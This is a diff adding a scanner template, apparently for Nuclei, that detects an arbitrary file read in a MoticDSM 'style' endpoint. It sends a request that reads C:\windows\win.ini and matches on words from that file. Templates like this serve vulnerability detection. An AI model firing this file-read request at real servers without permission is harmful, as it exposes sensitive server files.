@@ -1,0 +1,25 @@
+id: poc-yaml-moticdsm-style-readfile
+
+info:
+  name: MoticDSM Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    The MoticDSM endpoint allows arbitrary file reading through the 'style' parameter in the URL. This could be exploited to access sensitive files on the server.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/UploadService/Page/style?f=C:\\windows\\win.ini"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "bit app support"
+          - "fonts"
+          - "extensions"
+        part: body
